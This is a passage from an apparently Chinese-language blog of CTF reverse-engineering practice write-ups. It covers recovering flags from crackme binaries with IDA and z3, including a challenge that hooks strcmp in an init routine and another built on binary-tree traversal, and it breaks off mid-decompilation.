<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public static string Md5(string <span class="built_in">str</span>)</span><br><span class="line">&#123;</span><br><span class="line">	byte[] <span class="built_in">bytes</span> = Encoding.UTF8.GetBytes(<span class="built_in">str</span>);</span><br><span class="line">	byte[] array = MD5.Create().ComputeHash(<span class="built_in">bytes</span>);</span><br><span class="line">	StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">	foreach (byte b <span class="keyword">in</span> array)</span><br><span class="line">	&#123;</span><br><span class="line">		stringBuilder.Append(b.ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> stringBuilder.ToString().Substring(<span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的X2就是将每个字节转换为两位的十六进制字符串，其实也可以一个个试，反正就四个</p>
<p>BJDCTF{B8C37E33DEFDE51CF91E}</p>
<h1 id="31-ACTF新生赛2020-Universe-final-answer"><a href="#31-ACTF新生赛2020-Universe-final-answer" class="headerlink" title="31.[ACTF新生赛2020]Universe_final_answer"></a>31.[ACTF新生赛2020]Universe_final_answer</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704010510525.png" alt="image-20230704010510525"></p>
<p>打开ida，查看字符串信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704010548953.png" alt="image-20230704010548953"></p>
<p>进入关键函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704113919794.png" alt="image-20230704113919794"></p>
<p>跟进sub_860()看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704114854127.png" alt="image-20230704114854127"></p>
<p>这不就是解方程吗，就是未知数有点多，用z3解，这里又搜寻回顾了一下z3库的用法</p>
<h3 id="有理数-Real-型解方程求解"><a href="#有理数-Real-型解方程求解" class="headerlink" title="有理数(Real)型解方程求解"></a>有理数(Real)型解方程求解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Real(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x**<span class="number">2</span> + y**<span class="number">2</span> == <span class="number">3</span>)</span><br><span class="line">s.add(x**<span class="number">3</span> == <span class="number">2</span>)</span><br><span class="line">check = s.check()</span><br><span class="line"><span class="built_in">print</span>(check)</span><br><span class="line">model = s.model()</span><br><span class="line"><span class="built_in">print</span>(model)</span><br><span class="line"><span class="comment"># sat</span></span><br><span class="line"><span class="comment"># [y = -1.1885280594?, x = 1.2599210498?]</span></span><br></pre></td></tr></table></figure>

<h3 id="位向量-BitVec-型解方程"><a href="#位向量-BitVec-型解方程" class="headerlink" title="位向量(BitVec)型解方程"></a>位向量(BitVec)型解方程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#只定义一个位向量时</span></span><br><span class="line">m = BitVec(<span class="string">&#x27;m&#x27;</span>,<span class="number">8</span>)<span class="comment">#8代表初始化位向量的bit位数，8位，即1个字节</span></span><br><span class="line"><span class="comment">#同时定义多个位向量时</span></span><br><span class="line">x, y, z = BitVecs(<span class="string">&#x27;x y z&#x27;</span>, <span class="number">8</span>)<span class="comment">#1、定义求解的数据类型为real有理数</span></span><br><span class="line">s = Solver()<span class="comment">#2、初始化一个Solver类</span></span><br><span class="line">s.add(x ^ y &amp; z == <span class="number">12</span>)<span class="comment">#3、对于数据进行约束、即写方程</span></span><br><span class="line">s.add(y &amp; z &gt;&gt; <span class="number">3</span> == <span class="number">3</span>)</span><br><span class="line">s.add(z ^ y == <span class="number">4</span>)</span><br><span class="line">check = s.check()<span class="comment">#4、检测是否有解（有解sat、无解unsat）</span></span><br><span class="line"><span class="built_in">print</span>(check)</span><br><span class="line">model = s.model()<span class="comment">#5、取出所有结果，一个ModelRef类，</span></span><br><span class="line"><span class="built_in">print</span>(model)</span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line"><span class="comment"># sat</span></span><br><span class="line"><span class="comment"># [z = 27, y = 31, x = 23]</span></span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v1 = Int(<span class="string">&#x27;v1&#x27;</span>)</span><br><span class="line">v2 = Int(<span class="string">&#x27;v2&#x27;</span>)</span><br><span class="line">v3 = Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v4 = Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">v5 = Int(<span class="string">&#x27;v5&#x27;</span>)</span><br><span class="line">v6 = Int(<span class="string">&#x27;v6&#x27;</span>)</span><br><span class="line">v7 = Int(<span class="string">&#x27;v7&#x27;</span>)</span><br><span class="line">v8 = Int(<span class="string">&#x27;v8&#x27;</span>)</span><br><span class="line">v9 = Int(<span class="string">&#x27;v9&#x27;</span>)</span><br><span class="line">v11 = Int(<span class="string">&#x27;v11&#x27;</span>)</span><br><span class="line">solve(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>,</span><br><span class="line">    <span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -<span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>,</span><br><span class="line">    -<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 *<span class="number">64</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>,</span><br><span class="line">    <span class="number">71</span> * v6 + (v7 * <span class="number">128</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>,</span><br><span class="line">    <span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -<span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>,</span><br><span class="line">    -<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>,</span><br><span class="line">    -<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>,</span><br><span class="line">    <span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>,</span><br><span class="line">    <span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -<span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>,</span><br><span class="line">    <span class="number">99</span> * v11 + -<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -<span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[v1 = 48, </span></span><br><span class="line"><span class="string"> v6 = 95, </span></span><br><span class="line"><span class="string"> v2 = 70, </span></span><br><span class="line"><span class="string"> v4 = 82, </span></span><br><span class="line"><span class="string"> v11 = 64,</span></span><br><span class="line"><span class="string"> v3 = 117,</span></span><br><span class="line"><span class="string"> v5 = 84,</span></span><br><span class="line"><span class="string"> v9 = 119,</span></span><br><span class="line"><span class="string"> v8 = 55,</span></span><br><span class="line"><span class="string"> v7 = 121]</span></span><br><span class="line"><span class="string"> 调整下顺序</span></span><br><span class="line"><span class="string"> 70,48,117,82,84,95,121,55,119,64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>回到主函数,跟进一下sub_C50()函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704131925142.png" alt="image-20230704131925142"></p>
<p>应该是把将数字转换为对应字母</p>
<p> 70,48,117,82,84,95,121,55,119,64对应的字母就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[ <span class="number">70</span>,<span class="number">48</span>,<span class="number">117</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">55</span>,<span class="number">119</span>,<span class="number">64</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(a[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>F0uRT_y7w@</p>
<p>在Linux下运行程序</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704132841584.png" alt="image-20230704132841584"></p>
<p>flag{F0uRTy_7w@_42}</p>
<h1 id="32-Zer0pts2020-easy-strcmp"><a href="#32-Zer0pts2020-easy-strcmp" class="headerlink" title="32.[Zer0pts2020]easy strcmp"></a>32.[Zer0pts2020]easy strcmp</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704211950931.png" alt="image-20230704211950931"></p>
<p>打开ida，查看字符串信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704212024363.png" alt="image-20230704212024363"></p>
<p>进入关键函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704212156520.png" alt="image-20230704212156520"></p>
<p>比较这一串字符串，但是不可能这么简单</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704231749265.png" alt="image-20230704231749265"></p>
<p>main函数前还有这些函数，看看什么情况</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704231847110.png" alt="image-20230704231847110"></p>
<p>一直到sub_6EA，有这些类似加密操作的出现</p>
<p>但当我试图用IDA查看该函数的交叉引用，会发现提示：</p>
<blockquote>
<p>Couldn’t find any xrefs!</p>
</blockquote>
<p>init函数在程序加载时被调用，它负责设置程序的运行环境和执行一些必要的初始化操作。具体的功能和实现方式取决于被分析的程序。下面是一些init函数可能涉及的任务：</p>
<ol>
<li>程序环境设置：init函数可能会设置程序的全局变量、初始化数据结构或分配内存等，以确保程序在后续执行过程中的正常运行。</li>
<li>库初始化：在某些情况下，程序可能依赖于外部库或模块。init函数可以用于加载这些库，并进行必要的初始化操作，以确保程序能够正确地使用这些库。</li>
<li>系统资源分配：init函数可能会进行系统资源的分配，例如打开文件、建立网络连接等。这些资源的初始化操作可以在init函数中完成。</li>
<li>全局状态初始化：init函数可能会初始化程序的全局状态，例如将全局变量设置为初始值、重置计数器等。</li>
</ol>
<p>总之，init函数在程序加载时被调用，负责进行初始化操作，确保程序在后续执行过程中的正确运行。具体的功能和实现方式取决于程序本身的设计和要求。</p>
<p>fini函数是在程序即将退出时被调用的函数，它负责执行一些收尾工作。具体的功能和实现方式取决于被分析的程序。下面是一些fini函数可能涉及的任务：</p>
<ol>
<li>资源释放：fini函数通常用于释放程序运行过程中分配的资源，如释放内存、关闭文件句柄、断开网络连接等。这样可以确保在程序退出之前，已经使用的资源都被正确地释放掉，避免资源泄漏。</li>
<li>数据保存：有时，fini函数还可以负责将程序运行过程中的数据保存到文件或其他存储介质中。这样可以确保在下次运行程序时，可以加载之前的状态或数据。</li>
<li>状态清理：fini函数可能会对程序的全局状态进行清理，例如将全局变量恢复为默认值、关闭运行时的线程等。这样可以确保程序退出时的状态是一致的。</li>
</ol>
<p>总之，fini函数在程序即将退出时被调用，负责进行清理和释放资源的操作。具体的功能和实现方式取决于程序本身的设计和要求</p>
<p>所以去init函数看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704234513363.png" alt="image-20230704234513363"></p>
<p> for循环中调用了一系列的函数，而函数地址从funcs_889开始，跟入便能够发现如下内容：</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704234614255.png" alt="image-20230704234614255"></p>
<p>让我们看看发现了什么东西，sub_6E0，sub_795</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704235315343.png" alt="image-20230704235315343"></p>
<p>sub_650()里面没什么东西，看看sub_795吧</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704235601505.png" alt="image-20230704235601505"></p>
<p>可见，off_201028被置为sub_6EA函数地址了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704235814765.png" alt="image-20230704235814765"></p>
<p>可以看到，off_2010288实际上是strcmp函数的地址，但现在它被替换成了sub_6EA</p>
<p>  因此我们执行strcmp函数时实际上是执行sub_6EA函数，简单的hook，但是这也是我第一次接触到hook</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6EA</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    ;</span><br><span class="line">  v4 = (i &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>;                            <span class="comment">// 每8位一处理</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v4; ++j )</span><br><span class="line">    *(_QWORD *)(<span class="number">8</span> * j + a1) -= qword_201060[j]; <span class="comment">// 每8位减去一个数</span></span><br><span class="line">  <span class="keyword">return</span> qword_201090(a1, a2);</span><br><span class="line">&#125;</span><br><span class="line"> ; _QWORD qword_201060[<span class="number">5</span>]</span><br><span class="line">dq <span class="number">0</span>, <span class="number">410</span>A4335494A0942h, <span class="number">0B</span>0EF2F50BE619F0h, <span class="number">4F</span>0A3A064A35282Bh,<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>shift+提取qword_201060、</p>
<p>unsigned char ida_chars[] =</p>
<p>{</p>
<p>  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42, 0x09, </p>
<p>  0x4A, 0x49, 0x35, 0x43, 0x0A, 0x41, 0xF0, 0x19, 0xE6, 0x0B, </p>
<p>  0xF5, 0xF2, 0x0E, 0x0B, 0x2B, 0x28, 0x35, 0x4A, 0x06, 0x3A, </p>
<p>  0x0A, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00</p>
<p>};</p>
<p>脚本如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&#x27;zer0pts&#123;********CENSORED********&#125;&#x27;</span></span><br><span class="line">data2=[<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x42</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x43</span>, <span class="number">0x0A</span>, <span class="number">0x41</span>, <span class="number">0xF0</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x0B</span>,</span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x2B</span>, <span class="number">0x28</span>, <span class="number">0x35</span>, <span class="number">0x4A</span>, <span class="number">0x06</span>, <span class="number">0x3A</span>,</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    tem=<span class="built_in">ord</span>(data[i])+data2[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((tem)),end=<span class="string">&#x27;&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>zer0pts{l3ts_m4kĳĴńńSOUR_t0d4y}</p>
<p>但是提交结果不对，后面参考了一下大佬的wp，发现没考虑到进位的问题</p>
<p>修改如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&#x27;zer0pts&#123;********CENSORED********&#125;&#x27;</span></span><br><span class="line">data2=[<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x42</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x43</span>, <span class="number">0x0A</span>, <span class="number">0x41</span>, <span class="number">0xF0</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x0B</span>,</span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x2B</span>, <span class="number">0x28</span>, <span class="number">0x35</span>, <span class="number">0x4A</span>, <span class="number">0x06</span>, <span class="number">0x3A</span>,</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>]</span><br><span class="line">f=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="keyword">if</span> f!=<span class="number">0</span>:</span><br><span class="line">        tem = <span class="built_in">ord</span>(data[i]) + data2[i]+f</span><br><span class="line">        f=<span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tem=<span class="built_in">ord</span>(data[i])+data2[i]</span><br><span class="line">    <span class="keyword">if</span> tem&gt;<span class="number">0xff</span>:</span><br><span class="line">        f=<span class="number">1</span></span><br><span class="line">    tem&amp;=<span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((tem)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是其实还是有点问题的，如果进位是2的话，就会出问题</p>
<p>zer0pts{l3ts_m4k3_4_DETOUR_t0d4y}</p>
<h1 id="33-WUSTCTF2020-level4"><a href="#33-WUSTCTF2020-level4" class="headerlink" title="33.[WUSTCTF2020]level4"></a>33.[WUSTCTF2020]level4</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230707110724513.png" alt="image-20230707110724513"></p>
<p>打开ida，进入main函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230707111133883.png" alt="image-20230707111133883"></p>
<p>Data Structure code，数据结构算法，还有关键词lsft和Right，很可能是左右子树，可能是前后中序遍历</p>
<p>跟进type1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">type1</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    type1(*((_QWORD *)a1 + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">putchar</span>(*a1);</span><br><span class="line">    result = type1(*((_QWORD *)a1 + <span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个看着很像，中序遍历，因为左中右</p>
<p>跟进type2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">type2</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    type2(*((_QWORD *)a1 + <span class="number">1</span>));</span><br><span class="line">    type2(*((_QWORD *)a1 + <span class="number">2</span>));</span><br><span class="line">    result = <span class="built_in">putchar</span>(*a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很像后序遍历</p>
<p>type3给注释掉了，main函数暂时没什么有用的信息了，但是前面还有个init函数没有跟进，跟进看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, <span class="string">&quot;I&#123;_&#125;Af2700ih_secTS2Et_wr&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    x[<span class="number">24</span> * i] = v2[i];</span><br><span class="line">  qword_601298 = (__int64)&amp;unk_6011E8;</span><br><span class="line">  qword_6011F0 = (__int64)&amp;unk_601260;</span><br><span class="line">  qword_601268 = (__int64)&amp;unk_6010F8;</span><br><span class="line">  qword_601100 = (__int64)&amp;unk_601110;</span><br><span class="line">  qword_601108 = (__int64)&amp;unk_601140;</span><br><span class="line">  qword_601270 = (__int64)&amp;unk_601230;</span><br><span class="line">  qword_601238 = (__int64)&amp;unk_601158;</span><br><span class="line">  qword_601240 = (__int64)&amp;unk_601098;</span><br><span class="line">  qword_6010A0 = (__int64)&amp;unk_601200;</span><br><span class="line">  qword_6010A8 = (__int64)&amp;unk_601188;</span><br><span class="line">  qword_6011F8 = (__int64)&amp;unk_601170;</span><br><span class="line">  qword_601178 = (__int64)&amp;unk_6011B8;</span><br><span class="line">  qword_601180 = (__int64)&amp;unk_6010B0;</span><br><span class="line">  qword_6010B8 = (__int64)x;</span><br><span class="line">  qword_6010C0 = (__int64)&amp;unk_601218;</span><br><span class="line">  qword_6012A0 = 